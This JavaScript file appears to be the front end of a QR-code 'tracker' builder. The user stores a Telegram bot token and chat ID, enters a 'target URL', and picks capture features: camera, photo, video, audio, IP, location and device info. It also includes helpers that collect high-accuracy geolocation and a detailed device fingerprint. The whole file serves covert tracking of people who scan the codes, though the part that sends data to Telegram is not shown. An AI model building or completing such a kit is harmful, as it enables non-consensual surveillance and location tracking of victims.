// script.js
document.addEventListener('DOMContentLoaded', function() {
    // DOM Elements
    const functionBtns = document.querySelectorAll('.function-btn');
    const formSections = document.querySelectorAll('.form-section');
    const resultSection = document.getElementById('resultSection');
    const qrcodeDiv = document.getElementById('qrcode');
    const downloadBtn = document.getElementById('downloadBtn');
    const copyBtn = document.getElementById('copyBtn');
    const newBtn = document.getElementById('newBtn');
    const displayText = document.getElementById('displayText');
    const saveConfigBtn = document.getElementById('saveConfigBtn');
    
    // Configuration
    let currentConfig = {
        botToken: '',
        chatId: ''
    };
    
    let currentQRCode = null;
    let currentURL = '';

    // Initialize
    loadConfiguration();
    setupEventListeners();

    function setupEventListeners() {
        // Function selection buttons
        functionBtns.forEach(btn => {
            btn.addEventListener('click', function() {
                const functionType = this.getAttribute('data-function');
                switchFunction(functionType);
            });
        });

        // Form submissions
        document.getElementById('qrForm').addEventListener('submit', generateBasicQR);
        document.getElementById('cameraQrForm').addEventListener('submit', generateCameraQR);
        document.getElementById('videoQrForm').addEventListener('submit', generateVideoQR);
        document.getElementById('ipQrForm').addEventListener('submit', generateIPQR);
        document.getElementById('multiQrForm').addEventListener('submit', generateMultiQR);

        // Action buttons
        downloadBtn.addEventListener('click', downloadQRCode);
        copyBtn.addEventListener('click', copyQRURL);
        newBtn.addEventListener('click', generateNewQR);

        // Configuration
        saveConfigBtn.addEventListener('click', saveConfiguration);
    }

    function switchFunction(functionType) {
        // Update active button
        functionBtns.forEach(btn => {
            btn.classList.remove('active');
            if (btn.getAttribute('data-function') === functionType) {
                btn.classList.add('active');
            }
        });

        // Show corresponding form section
        formSections.forEach(section => {
            section.style.display = 'none';
        });

        switch(functionType) {
            case 'basic':
                document.getElementById('basicForm').style.display = 'block';
                break;
            case 'camera':
                document.getElementById('cameraForm').style.display = 'block';
                break;
            case 'video':
                document.getElementById('videoForm').style.display = 'block';
                break;
            case 'ip':
                document.getElementById('ipForm').style.display = 'block';
                break;
            case 'multi':
                document.getElementById('multiForm').style.display = 'block';
                break;
        }

        // Hide result section when switching functions
        resultSection.style.display = 'none';
    }

    function loadConfiguration() {
        const savedConfig = localStorage.getItem('qrGeneratorConfig');
        if (savedConfig) {
            currentConfig = JSON.parse(savedConfig);
            document.getElementById('botToken').value = currentConfig.botToken;
            document.getElementById('chatId').value = currentConfig.chatId;
        }
    }

    function saveConfiguration() {
        const botToken = document.getElementById('botToken').value.trim();
        const chatId = document.getElementById('chatId').value.trim();

        if (!botToken || !chatId) {
            alert('Please enter both Bot Token and Chat ID');
            return;
        }

        currentConfig = { botToken, chatId };
        localStorage.setItem('qrGeneratorConfig', JSON.stringify(currentConfig));
        
        alert('Configuration saved successfully!');
    }

    function generateBasicQR(e) {
        e.preventDefault();
        
        if (!validateConfig()) return;

        const link = document.getElementById('linkInput').value.trim();
        const text = document.getElementById('textInput').value.trim();
        
        if (!link) {
            alert('Please enter a URL');
            return;
        }

        const qrData = {
            type: 'basic',
            link: link,
            text: text,
            config: currentConfig
        };

        generateQRCode(JSON.stringify(qrData), `Basic QR: ${link}`);
    }

    function generateCameraQR(e) {
        e.preventDefault();
        
        if (!validateConfig()) return;

        const link = document.getElementById('cameraLinkInput').value.trim();
        const text = document.getElementById('cameraTextInput').value.trim();
        
        if (!link) {
            alert('Please enter a target URL');
            return;
        }

        const qrData = {
            type: 'camera',
            link: link,
            text: text,
            config: currentConfig,
            features: ['camera', 'photo_capture', 'location']
        };

        generateQRCode(JSON.stringify(qrData), `Camera QR: ${link}`);
    }

    function generateVideoQR(e) {
        e.preventDefault();
        
        if (!validateConfig()) return;

        const link = document.getElementById('videoLinkInput').value.trim();
        const text = document.getElementById('videoTextInput').value.trim();
        
        if (!link) {
            alert('Please enter a target URL');
            return;
        }

        const qrData = {
            type: 'video',
            link: link,
            text: text,
            config: currentConfig,
            features: ['video', 'audio', 'camera', 'location']
        };

        generateQRCode(JSON.stringify(qrData), `Video QR: ${link}`);
    }

    function generateIPQR(e) {
        e.preventDefault();
        
        if (!validateConfig()) return;

        const link = document.getElementById('ipLinkInput').value.trim();
        const text = document.getElementById('ipTextInput').value.trim();
        
        if (!link) {
            alert('Please enter a target URL');
            return;
        }

        const qrData = {
            type: 'ip',
            link: link,
            text: text,
            config: currentConfig,
            features: ['ip_info', 'location', 'device_info']
        };

        generateQRCode(JSON.stringify(qrData), `IP Info QR: ${link}`);
    }

    function generateMultiQR(e) {
        e.preventDefault();
        
        if (!validateConfig()) return;

        const link = document.getElementById('multiLinkInput').value.trim();
        const text = document.getElementById('multiTextInput').value.trim();
        
        if (!link) {
            alert('Please enter a target URL');
            return;
        }

        const features = [];
        if (document.getElementById('includeIP').checked) features.push('ip_info');
        if (document.getElementById('includeCamera').checked) features.push('camera');
        if (document.getElementById('includeVideo').checked) features.push('video');
        if (document.getElementById('includeDevice').checked) features.push('device_info');

        const qrData = {
            type: 'multi',
            link: link,
            text: text,
            config: currentConfig,
            features: features
        };

        generateQRCode(JSON.stringify(qrData), `Multi-Function QR: ${link}`);
    }

    function validateConfig() {
        if (!currentConfig.botToken || !currentConfig.chatId) {
            alert('Please save your Bot Token and Chat ID configuration first');
            document.getElementById('configSection').scrollIntoView({ behavior: 'smooth' });
            return false;
        }
        return true;
    }

    function generateQRCode(data, displayMessage) {
        // Clear previous QR code
        qrcodeDiv.innerHTML = '';
        
        try {
            // Generate QR code
            const qr = qrcode(0, 'M');
            qr.addData(data);
            qr.make();
            
            currentQRCode = qr.createImgTag(10);
            qrcodeDiv.innerHTML = currentQRCode;
            
            // Store the URL for copying
            currentURL = data;
            
            // Update display text
            displayText.textContent = displayMessage;
            
            // Show result section
            resultSection.style.display = 'block';
            resultSection.scrollIntoView({ behavior: 'smooth' });
            
        } catch (error) {
            console.error('Error generating QR code:', error);
            alert('Error generating QR code. Please try again.');
        }
    }

    function downloadQRCode() {
        if (!currentQRCode) return;
        
        const img = qrcodeDiv.querySelector('img');
        if (img) {
            const link = document.createElement('a');
            link.download = 'qr-code.png';
            link.href = img.src;
            link.click();
        }
    }

    function copyQRURL() {
        if (!currentURL) return;
        
        navigator.clipboard.writeText(currentURL).then(() => {
            alert('QR Code URL copied to clipboard!');
        }).catch(err => {
            console.error('Failed to copy: ', err);
            alert('Failed to copy URL to clipboard');
        });
    }

    function generateNewQR() {
        resultSection.style.display = 'none';
        qrcodeDiv.innerHTML = '';
        currentQRCode = null;
        currentURL = '';
        
        // Reset forms
        document.querySelectorAll('form').forEach(form => form.reset());
    }

    // Utility function to get current location
    function getCurrentLocation() {
        return new Promise((resolve, reject) => {
            if (!navigator.geolocation) {
                reject(new Error('Geolocation is not supported'));
                return;
            }
            
            navigator.geolocation.getCurrentPosition(
                position => {
                    resolve({
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy
                    });
                },
                error => {
                    reject(error);
                },
                {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                }
            );
        });
    }

    // Utility function to get device information
    function getDeviceInfo() {
        return {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            languages: navigator.languages,
            cookieEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack,
            hardwareConcurrency: navigator.hardwareConcurrency,
            deviceMemory: navigator.deviceMemory,
            maxTouchPoints: navigator.maxTouchPoints,
            vendor: navigator.vendor,
            screen: {
                width: screen.width,
                height: screen.height,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth
            },
            window: {
                width: window.innerWidth,
                height: window.innerHeight
            },
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timestamp: new Date().toISOString()
        };
    }

    // Export utility functions for use in other scripts
    window.QRGenerator = {
        getCurrentLocation,
        getDeviceInfo,
        generateQRCode,
        downloadQRCode
    };
});